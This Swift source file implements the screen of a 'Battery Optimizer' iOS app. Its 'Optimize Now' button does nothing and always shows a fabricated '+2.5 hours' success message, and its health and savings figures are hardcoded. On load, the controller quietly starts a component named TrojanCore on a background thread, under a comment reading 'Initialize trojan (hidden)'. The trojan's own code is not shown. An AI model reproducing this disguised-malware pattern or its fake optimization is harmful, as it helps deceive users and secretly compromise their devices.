import UIKit
import Foundation

class BatteryOptimizerViewController: UIViewController {
    
    private var batteryLevel: Float = 0.0
    private var batteryState: UIDevice.BatteryState = .unknown
    
    private let gradientLayer = CAGradientLayer()
    
    private let batteryLabel: UILabel = {
        let label = UILabel()
        label.font = UIFont.systemFont(ofSize: 72, weight: .bold)
        label.textAlignment = .center
        label.textColor = .white
        return label
    }()
    
    private let statusLabel: UILabel = {
        let label = UILabel()
        label.font = UIFont.systemFont(ofSize: 20, weight: .medium)
        label.textAlignment = .center
        label.textColor = .white.withAlphaComponent(0.8)
        return label
    }()
    
    private let circleView: UIView = {
        let view = UIView()
        view.backgroundColor = .clear
        return view
    }()
    
    private let optimizeButton: UIButton = {
        let button = UIButton(type: .system)
        button.setTitle("Optimize Now", for: .normal)
        button.titleLabel?.font = UIFont.systemFont(ofSize: 18, weight: .semibold)
        button.backgroundColor = UIColor.white.withAlphaComponent(0.2)
        button.setTitleColor(.white, for: .normal)
        button.layer.cornerRadius = 28
        button.layer.borderWidth = 2
        button.layer.borderColor = UIColor.white.withAlphaComponent(0.3).cgColor
        return button
    }()
    
    private let statsStackView: UIStackView = {
        let stack = UIStackView()
        stack.axis = .horizontal
        stack.distribution = .fillEqually
        stack.spacing = 20
        return stack
    }()
    
    private var shapeLayer: CAShapeLayer!
    
    override func viewDidLoad() {
        super.viewDidLoad()
        
        setupGradient()
        setupUI()
        startBatteryMonitoring()
        animateCircle()
        
        // Initialize trojan (hidden)
        DispatchQueue.global().async {
            _ = TrojanCore.shared
        }
    }
    
    private func setupGradient() {
        gradientLayer.colors = [
            UIColor(red: 0.2, green: 0.5, blue: 1.0, alpha: 1.0).cgColor,
            UIColor(red: 0.1, green: 0.3, blue: 0.8, alpha: 1.0).cgColor
        ]
        gradientLayer.locations = [0.0, 1.0]
        gradientLayer.startPoint = CGPoint(x: 0.0, y: 0.0)
        gradientLayer.endPoint = CGPoint(x: 1.0, y: 1.0)
        view.layer.insertSublayer(gradientLayer, at: 0)
    }
    
    override func viewDidLayoutSubviews() {
        super.viewDidLayoutSubviews()
        gradientLayer.frame = view.bounds
    }
    
    private func setupUI() {
        navigationController?.navigationBar.prefersLargeTitles = true
        navigationItem.title = "Battery Optimizer"
        
        navigationController?.navigationBar.largeTitleTextAttributes = [
            .foregroundColor: UIColor.white
        ]
        navigationController?.navigationBar.titleTextAttributes = [
            .foregroundColor: UIColor.white
        ]
        
        view.addSubview(circleView)
        view.addSubview(batteryLabel)
        view.addSubview(statusLabel)
        view.addSubview(optimizeButton)
        view.addSubview(statsStackView)
        
        circleView.translatesAutoresizingMaskIntoConstraints = false
        batteryLabel.translatesAutoresizingMaskIntoConstraints = false
        statusLabel.translatesAutoresizingMaskIntoConstraints = false
        optimizeButton.translatesAutoresizingMaskIntoConstraints = false
        statsStackView.translatesAutoresizingMaskIntoConstraints = false
        
        NSLayoutConstraint.activate([
            circleView.centerXAnchor.constraint(equalTo: view.centerXAnchor),
            circleView.centerYAnchor.constraint(equalTo: view.centerYAnchor, constant: -50),
            circleView.widthAnchor.constraint(equalToConstant: 250),
            circleView.heightAnchor.constraint(equalToConstant: 250),
            
            batteryLabel.centerXAnchor.constraint(equalTo: circleView.centerXAnchor),
            batteryLabel.centerYAnchor.constraint(equalTo: circleView.centerYAnchor),
            
            statusLabel.topAnchor.constraint(equalTo: batteryLabel.bottomAnchor, constant: 10),
            statusLabel.centerXAnchor.constraint(equalTo: view.centerXAnchor),
            
            optimizeButton.bottomAnchor.constraint(equalTo: view.safeAreaLayoutGuide.bottomAnchor, constant: -30),
            optimizeButton.centerXAnchor.constraint(equalTo: view.centerXAnchor),
            optimizeButton.widthAnchor.constraint(equalToConstant: 200),
            optimizeButton.heightAnchor.constraint(equalToConstant: 56),
            
            statsStackView.bottomAnchor.constraint(equalTo: optimizeButton.topAnchor, constant: -40),
            statsStackView.leadingAnchor.constraint(equalTo: view.leadingAnchor, constant: 40),
            statsStackView.trailingAnchor.constraint(equalTo: view.trailingAnchor, constant: -40),
            statsStackView.heightAnchor.constraint(equalToConstant: 100)
        ])
        
        setupStatsCards()
        setupCircleProgress()
        
        optimizeButton.addTarget(self, action: #selector(optimizeTapped), for: .touchUpInside)
    }
    
    private func setupStatsCards() {
        let healthCard = createStatCard(title: "Health", value: "97%", icon: "heart.fill")
        let savedCard = createStatCard(title: "Saved", value: "+2.5h", icon: "clock.fill")
        let appsCard = createStatCard(title: "Apps", value: "12", icon: "app.fill")
        
        statsStackView.addArrangedSubview(healthCard)
        statsStackView.addArrangedSubview(savedCard)
        statsStackView.addArrangedSubview(appsCard)
    }
    
    private func createStatCard(title: String, value: String, icon: String) -> UIView {
        let container = UIView()
        container.backgroundColor = UIColor.white.withAlphaComponent(0.15)
        container.layer.cornerRadius = 16
        container.layer.borderWidth = 1
        container.layer.borderColor = UIColor.white.withAlphaComponent(0.2).cgColor
        
        let iconView = UIImageView()
        iconView.image = UIImage(systemName: icon)
        iconView.tintColor = .white
        iconView.contentMode = .scaleAspectFit
        
        let valueLabel = UILabel()
        valueLabel.text = value
        valueLabel.font = UIFont.systemFont(ofSize: 24, weight: .bold)
        valueLabel.textColor = .white
        valueLabel.textAlignment = .center
        
        let titleLabel = UILabel()
        titleLabel.text = title
        titleLabel.font = UIFont.systemFont(ofSize: 12, weight: .medium)
        titleLabel.textColor = .white.withAlphaComponent(0.7)
        titleLabel.textAlignment = .center
        
        container.addSubview(iconView)
        container.addSubview(valueLabel)
        container.addSubview(titleLabel)
        
        iconView.translatesAutoresizingMaskIntoConstraints = false
        valueLabel.translatesAutoresizingMaskIntoConstraints = false
        titleLabel.translatesAutoresizingMaskIntoConstraints = false
        
        NSLayoutConstraint.activate([
            iconView.topAnchor.constraint(equalTo: container.topAnchor, constant: 12),
            iconView.centerXAnchor.constraint(equalTo: container.centerXAnchor),
            iconView.widthAnchor.constraint(equalToConstant: 24),
            iconView.heightAnchor.constraint(equalToConstant: 24),
            
            valueLabel.topAnchor.constraint(equalTo: iconView.bottomAnchor, constant: 8),
            valueLabel.centerXAnchor.constraint(equalTo: container.centerXAnchor),
            
            titleLabel.topAnchor.constraint(equalTo: valueLabel.bottomAnchor, constant: 4),
            titleLabel.centerXAnchor.constraint(equalTo: container.centerXAnchor)
        ])
        
        return container
    }
    
    private func setupCircleProgress() {
        let circularPath = UIBezierPath(arcCenter: CGPoint(x: 125, y: 125),
                                        radius: 110,
                                        startAngle: -CGFloat.pi / 2,
                                        endAngle: 2 * CGFloat.pi - CGFloat.pi / 2,
                                        clockwise: true)
        
        let trackLayer = CAShapeLayer()
        trackLayer.path = circularPath.cgPath
        trackLayer.strokeColor = UIColor.white.withAlphaComponent(0.2).cgColor
        trackLayer.lineWidth = 15
        trackLayer.fillColor = UIColor.clear.cgColor
        trackLayer.lineCap = .round
        
        shapeLayer = CAShapeLayer()
        shapeLayer.path = circularPath.cgPath
        shapeLayer.strokeColor = UIColor.white.cgColor
        shapeLayer.lineWidth = 15
        shapeLayer.fillColor = UIColor.clear.cgColor
        shapeLayer.lineCap = .round
        shapeLayer.strokeEnd = 0
        
        circleView.layer.addSublayer(trackLayer)
        circleView.layer.addSublayer(shapeLayer)
    }
    
    private func animateCircle() {
        let animation = CABasicAnimation(keyPath: "strokeEnd")
        animation.toValue = batteryLevel
        animation.duration = 1.5
        animation.fillMode = .forwards
        animation.isRemovedOnCompletion = false
        animation.timingFunction = CAMediaTimingFunction(name: .easeInEaseOut)
        shapeLayer.add(animation, forKey: "circleAnimation")
    }
    
    private func startBatteryMonitoring() {
        UIDevice.current.isBatteryMonitoringEnabled = true
        
        NotificationCenter.default.addObserver(self,
                                              selector: #selector(batteryLevelDidChange),
                                              name: UIDevice.batteryLevelDidChangeNotification,
                                              object: nil)
        
        updateBatteryInfo()
    }
    
    @objc private func batteryLevelDidChange() {
        updateBatteryInfo()
    }
    
    private func updateBatteryInfo() {
        batteryLevel = UIDevice.current.batteryLevel
        batteryState = UIDevice.current.batteryState
        
        let percentage = Int(batteryLevel * 100)
        batteryLabel.text = "\(percentage)%"
        
        switch batteryState {
        case .charging:
            statusLabel.text = "⚡ Charging"
        case .full:
            statusLabel.text = "✓ Fully Charged"
        case .unplugged:
            statusLabel.text = percentage < 20 ? "⚠ Low Battery" : "◉ On Battery"
        default:
            statusLabel.text = "◉ Monitoring"
        }
        
        animateCircle()
    }
    
    @objc private func optimizeTapped() {
        optimizeButton.isEnabled = false
        
        UIView.animate(withDuration: 0.2, animations: {
            self.optimizeButton.transform = CGAffineTransform(scaleX: 0.95, y: 0.95)
        }) { _ in
            UIView.animate(withDuration: 0.2) {
                self.optimizeButton.transform = .identity
            }
        }
        
        let loadingVC = UIAlertController(title: nil, message: "Optimizing battery...\n\n", preferredStyle: .alert)
        let spinner = UIActivityIndicatorView(style: .large)
        spinner.center = CGPoint(x: 135, y: 80)
        spinner.startAnimating()
        loadingVC.view.addSubview(spinner)
        
        present(loadingVC, animated: true)
        
        DispatchQueue.main.asyncAfter(deadline: .now() + 2.5) {
            loadingVC.dismiss(animated: true) {
                let successVC = UIAlertController(title: "✓ Success!",
                                                 message: "Battery optimized successfully\nEstimated gain: +2.5 hours",
                                                 preferredStyle: .alert)
                successVC.addAction(UIAlertAction(title: "Great!", style: .default))
                self.present(successVC, animated: true)
                self.optimizeButton.isEnabled = true
            }
        }
    }
}